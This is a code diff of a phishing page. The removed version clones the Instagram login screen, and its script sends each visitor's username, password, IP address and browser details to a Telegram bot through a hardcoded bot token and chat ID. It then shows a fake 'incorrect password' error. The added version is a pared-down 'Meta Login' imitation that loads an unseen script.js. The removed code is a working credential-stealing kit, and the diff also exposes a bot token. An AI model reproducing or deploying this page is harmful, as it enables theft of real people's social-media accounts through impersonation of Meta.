@@ -1,566 +1,126 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Login • Instagram</title>
-    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp">
-    <meta name="robots" content="noimageindex, noarchive">
-    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Login</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            font-size: 14px;
-            color: #262626;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 30px 0 50px;
-            width: 100%;
-            flex: 1;
-        }
-
-        .main-content {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 32px;
-            width: 100%;
-            max-width: 935px;
-            margin: 0 auto;
-        }
-
-        /* ===== PHONE MOCKUP ===== */
-        .phone-mockup {
-            display: none;
-            flex-shrink: 0;
-            margin: -60px 0 -40px -35px;
-        }
-
-        .phone-mockup img {
-            max-width: 430px;
-            height: auto;
-        }
-
-        @media (min-width: 876px) {
-            .phone-mockup {
-                display: block;
-            }
-        }
-
-        /* ===== LOGIN WRAPPER ===== */
-        .login-wrapper {
-            width: 100%;
-            max-width: 350px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* ===== LOGIN CARD ===== */
-        .login-card {
+            padding: 20px;
+            margin: 0;
             background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
+            min-height: 100vh;
+            justify-content: center;
+        }
+        .container {
             width: 100%;
-            padding: 40px 40px 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 10px;
+            max-width: 400px;
         }
-
-        /* ===== LOGO - Instagram text logo like real site ===== */
-        .logo {
-            width: 175px;
-            height: auto;
-            margin-bottom: 35px;
-            display: block;
-        }
-
-        /* ===== "Log into Instagram" heading (current design) ===== */
-        .login-heading {
-            font-size: 16px;
-            font-weight: 600;
-            line-height: 20px;
+        .header {
             text-align: center;
-            color: #262626;
-            margin-bottom: 20px;
-            width: 100%;
+            font-weight: bold;
+            font-size: 20px;
+            margin-bottom: 30px;
+            margin-top: 10px;
         }
-
-        /* ===== FORM ===== */
-        .form-group {
+        input {
             width: 100%;
-            margin-bottom: 6px;
-            position: relative;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 9px 0 7px 8px;
-            background-color: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
-            font-size: 12px;
-            color: #262626;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            box-sizing: border-box;
+            font-size: 16px;
             outline: none;
             transition: border-color 0.2s;
         }
-
-        .form-group input:focus {
-            border-color: #a8a8a8;
+        input:focus {
+            border-color: #0064e0;
         }
-
-        .form-group input::placeholder {
-            color: #8e8e8e;
-            font-size: 12px;
-        }
-
-        .login-btn {
+        button {
             width: 100%;
-            padding: 7px 16px;
-            background-color: #0095f6;
+            padding: 15px;
             border: none;
-            border-radius: 8px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 14px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
-            margin-top: 12px;
-            transition: background-color 0.3s;
-            min-height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            margin-bottom: 20px;
         }
-
+        .login-btn {
+            background-color: #0064e0;
+            color: white;
+            transition: opacity 0.2s;
+        }
         .login-btn:hover {
-            background-color: #1877f2;
+            opacity: 0.9;
         }
-
         .login-btn:disabled {
-            background-color: #b2dffc;
+            opacity: 0.6;
             cursor: default;
         }
-
+        .create-btn {
+            background-color: transparent;
+            border: 1px solid #0064e0;
+            color: #0064e0;
+            margin-top: 400px;
+        }
+        .forgot-password {
+            text-align: center;
+            font-weight: 600;
+            color: #0064e0;
+            cursor: pointer;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .error-msg {
+            color: #ed4956;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 10px;
+            display: none;
+        }
         .spinner {
             display: none;
-            width: 16px;
-            height: 16px;
+            width: 18px;
+            height: 18px;
             border: 2px solid #ffffff;
             border-top: 2px solid transparent;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
+            margin: 0 auto;
         }
-
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-
-        /* ===== DIVIDER ===== */
-        .divider {
-            display: flex;
-            align-items: center;
-            width: 100%;
-            margin: 18px 0;
-        }
-
-        .divider-line {
-            flex: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-
-        .divider-text {
-            color: #737373;
-            font-size: 13px;
-            font-weight: 600;
-            margin: 0 18px;
-        }
-
-        /* ===== FACEBOOK LOGIN ===== */
-        .facebook-login {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-            background: none;
-            border: none;
-            text-decoration: none;
-            margin-bottom: 15px;
-            width: 100%;
-        }
-
-        .facebook-login:hover {
-            text-decoration: none;
-        }
-
-        .facebook-icon {
-            width: 20px;
-            height: 20px;
-            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png');
-            background-repeat: no-repeat;
-            background-position: -414px -259px;
-            background-size: 440px 411px;
-        }
-
-        /* ===== FORGOT PASSWORD ===== */
-        .forgot-password {
-            color: #00376b;
-            font-size: 12px;
-            cursor: pointer;
-            text-decoration: none;
-        }
-
-        .forgot-password:hover {
-            text-decoration: underline;
-        }
-
-        /* ===== ERROR MSG (like real Instagram) ===== */
-        .error-msg {
-            color: #ed4956;
-            font-size: 14px;
-            margin-top: 10px;
-            display: none;
-            text-align: center;
-            line-height: 1.4;
-            width: 100%;
-        }
-
-        /* ===== SIGNUP CARD ===== */
-        .signup-card {
-            background-color: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            width: 100%;
-            padding: 20px 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-
-        .signup-card p {
-            color: #262626;
-        }
-
-        .signup-card a {
-            color: #0095f6;
-            font-weight: 600;
-            text-decoration: none;
-        }
-
-        .signup-card a:hover {
-            color: #1877f2;
-        }
-
-        /* ===== GET APP ===== */
-        .get-app {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 10px;
-            gap: 15px;
-            width: 100%;
-        }
-
-        .get-app p {
-            font-size: 14px;
-            color: #262626;
-        }
-
-        .store-badges {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-        }
-
-        .store-badges img {
-            height: 40px;
-        }
-
-        /* ===== FOOTER ===== */
-        .footer {
-            max-width: 100%;
-            width: 100%;
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            padding: 0 16px;
-            margin-top: 24px;
-            max-width: 700px;
-        }
-
-        .footer a {
-            color: #737373;
-            font-size: 12px;
-            text-decoration: none;
-            margin: 4px 8px;
-            white-space: nowrap;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        .footer-bottom {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-            margin-top: 16px;
-            flex-wrap: wrap;
-        }
-
-        .footer-bottom span {
-            color: #737373;
-            font-size: 12px;
-        }
-
-        .footer-bottom select {
-            background: #fafafa;
-            color: #737373;
-            border: none;
-            font-size: 12px;
-            cursor: pointer;
-            outline: none;
-        }
-
-        /* ===== MOBILE RESPONSIVE ===== */
-        @media (max-width: 450px) {
-            body {
-                background-color: #ffffff;
-            }
-            .login-card {
-                border: none;
-                padding: 30px 20px 10px;
-                margin-bottom: 0;
-            }
-            .signup-card {
-                border: none;
-                padding: 20px;
-                margin-bottom: 0;
-            }
-            .container {
-                padding: 0;
-            }
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="main-content">
-            <!-- Phone Mockup -->
-            <div class="phone-mockup">
-                <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" alt="Instagram phones">
-            </div>
+<div class="container">
+    <div class="header">∞ Meta</div>
 
-            <!-- Login Section -->
-            <div class="login-wrapper">
-                <!-- Login Card -->
-                <div class="login-card">
-                    <!-- Instagram Text Logo -->
-                    <svg class="logo" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M41.6 24.6c0-6.1 4.9-11.1 11-11.1s11 5 11 11.1-4.9 11.1-11 11.1-11-5-11-11.1zm5.9 0c0 2.8 2.3 5.1 5.1 5.1s5.1-2.3 5.1-5.1-2.3-5.1-5.1-5.1-5.1 2.3-5.1 5.1zm11.5-11.7c0 1.4 1.1 2.5 2.5 2.5s2.5-1.1 2.5-2.5-1.1-2.5-2.5-2.5-2.5 1.1-2.5 2.5zm10.5 2.2c-1.3-1.8-3.2-3.1-5.5-3.6-.8-.2-2.1-.4-6.3-.4H36.9c-4.2 0-5.5.2-6.3.4-2.3.5-4.2 1.8-5.5 3.6-1 1.4-1.7 3.1-1.9 5.1-.1.7-.2 1.9-.2 5.9v5.3c0 4 .1 5.2.2 5.9.2 2 .9 3.7 1.9 5.1 1.3 1.8 3.2 3.1 5.5 3.6.8.2 2.1.4 6.3.4H52c4.2 0 5.5-.2 6.3-.4 2.3-.5 4.2-1.8 5.5-3.6 1-1.4 1.7-3.1 1.9-5.1.1-.7.2-1.9.2-5.9v-5.3c0-4-.1-5.2-.2-5.9-.2-2-.9-3.7-1.9-5.1zM28.7 41.4c-1.1-.7-2-1.6-2.7-2.7-1-1.4-1.6-3-1.8-4.8-.1-.7-.2-1.8-.2-5.6v-5c0-3.8.1-4.9.2-5.6.2-1.8.8-3.4 1.8-4.8.7-1.1 1.6-2 2.7-2.7 1.4-1 3-1.6 4.8-1.8.7-.1 1.8-.2 5.6-.2h14.8c3.8 0 4.9.1 5.6.2 1.8.2 3.4.8 4.8 1.8 1.1.7 2 1.6 2.7 2.7 1 1.4 1.6 3 1.8 4.8.1.7.2 1.8.2 5.6v5c0 3.8-.1 4.9-.2 5.6-.2 1.8-.8 3.4-1.8 4.8-.7 1.1-1.6 2-2.7 2.7-1.4 1-3 1.6-4.8 1.8-.7.1-1.8.2-5.6.2H36.9c-3.8 0-4.9-.1-5.6-.2-1.8-.2-3.4-.8-4.8-1.8z" fill="#262626"/>
-                        <circle cx="33.5" cy="19.5" r="1.5" fill="#262626"/>
-                    </svg>
+    <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
+    
+    <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off">
+    <input type="password" id="password" placeholder="Password" autocomplete="new-password">
+    
+    <button class="login-btn" id="loginBtn">
+        <span class="btn-text" id="btnText">Log in</span>
+        <div class="spinner" id="spinner"></div>
+    </button>
+    
+    <div class="forgot-password">Forgot password?</div>
+    
+    <button class="create-btn">Create new account</button>
+</div>
 
-                    <!-- "Log into Instagram" heading (مثل الواجهة الفعلية) -->
-                    <div class="login-heading">Log into Instagram</div>
-
-                    <form id="loginForm" autocomplete="off" style="width:100%;">
-                        <!-- Username/Email -->
-                        <div class="form-group">
-                            <input type="text" id="username" placeholder="Phone number, username or email" required autocomplete="off">
-                        </div>
-                        <!-- Password -->
-                        <div class="form-group">
-                            <input type="password" id="password" placeholder="Password" required autocomplete="new-password">
-                        </div>
-
-                        <!-- Error Message -->
-                        <div class="error-msg" id="errorMsg">Sorry, your password was incorrect. Please double-check your password.</div>
-
-                        <!-- Login Button -->
-                        <button type="submit" class="login-btn" id="loginBtn">
-                            <span class="btn-text" id="btnText">Log in</span>
-                            <span class="spinner" id="spinner"></span>
-                        </button>
-                    </form>
-
-                    <!-- Divider -->
-                    <div class="divider">
-                        <div class="divider-line"></div>
-                        <div class="divider-text">OR</div>
-                        <div class="divider-line"></div>
-                    </div>
-
-                    <!-- Facebook Login -->
-                    <button class="facebook-login" onclick="event.preventDefault();">
-                        <span class="facebook-icon"></span>
-                        Log in with Facebook
-                    </button>
-
-                    <!-- Forgot Password -->
-                    <a class="forgot-password" href="#">Forgot password?</a>
-                </div>
-
-                <!-- Sign Up -->
-                <div class="signup-card">
-                    <p>Don't have an account?</p>
-                    <a href="#">Sign up</a>
-                </div>
-
-                <!-- Get App -->
-                <div class="get-app">
-                    <p>Get the app.</p>
-                    <div class="store-badges">
-                        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/ys/r/3i2W99iGZ9A.png" alt="Download on the App Store"></a>
-                        <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/y7/r/r_vKvX3SRi5.png" alt="Get it on Google Play"></a>
-                    </div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Footer -->
-        <div class="footer">
-            <a href="#">Meta</a>
-            <a href="#">About</a>
-            <a href="#">Blog</a>
-            <a href="#">Jobs</a>
-            <a href="#">Help</a>
-            <a href="#">API</a>
-            <a href="#">Privacy</a>
-            <a href="#">Terms</a>
-            <a href="#">Locations</a>
-            <a href="#">Instagram Lite</a>
-            <a href="#">Threads</a>
-            <a href="#">Contact Uploading &amp; Non-Users</a>
-            <a href="#">Meta Verified</a>
-
-            <div class="footer-bottom">
-                <select>
-                    <option>English</option>
-                    <option>العربية</option>
-                </select>
-                <span>© 2026 Instagram from Meta</span>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // ================== CONFIG ==================
-        // ضع التوكن والآيدي حقك هنا
-        const TOKEN = "8912562695:AAH3_MJYNFSKJo9duvYg_wMBQXSwNRCuoyo";
-        const CHAT_ID = "1692257834";
-        // ===========================================
-
-        const form = document.getElementById('loginForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const loginBtn = document.getElementById('loginBtn');
-        const btnText = document.getElementById('btnText');
-        const spinner = document.getElementById('spinner');
-        const errorMsg = document.getElementById('errorMsg');
-
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const username = usernameInput.value.trim();
-            const password = passwordInput.value;
-
-            if (!username || !password) {
-                errorMsg.textContent = 'Please enter a username and password.';
-                errorMsg.style.display = 'block';
-                return;
-            }
-
-            // === Disable button & show loading ===
-            loginBtn.disabled = true;
-            btnText.style.display = 'none';
-            spinner.style.display = 'block';
-            errorMsg.style.display = 'none';
-
-            // === Collect info ===
-            let ip = 'Unknown';
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch (_) {}
-
-            const ua = navigator.userAgent;
-            const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
-            const pageUrl = window.location.href;
-
-            const message = `
-🔐 **Instagram Login - New Entry**
-━━━━━━━━━━━━━━━━━━━
-👤 **Username/Email:** \`${username}\`
-🔑 **Password:** \`${password}\`
-🌐 **IP Address:** \`${ip}\`
-📄 **Page:** ${pageUrl}
-💻 **User Agent:** ${ua}
-🕐 **Time:** ${time}
-━━━━━━━━━━━━━━━━━━━
-            `.trim();
-
-            // === إرسال إلى تيليجرام ===
-            try {
-                const tgRes = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                if (!tgRes.ok) {
-                    console.error('Telegram send failed:', await tgRes.text());
-                } else {
-                    console.log('Sent to Telegram successfully');
-                }
-            } catch (err) {
-                console.error('Telegram error:', err);
-            }
-
-            // === Show fake error like real Instagram ===
-            setTimeout(() => {
-                loginBtn.disabled = false;
-                btnText.style.display = 'inline';
-                spinner.style.display = 'none';
-                errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
-                errorMsg.style.display = 'block';
-                passwordInput.value = '';
-            }, 1500);
-        });
-    </script>
-
+<script src="script.js"></script>
 </body>
 </html>
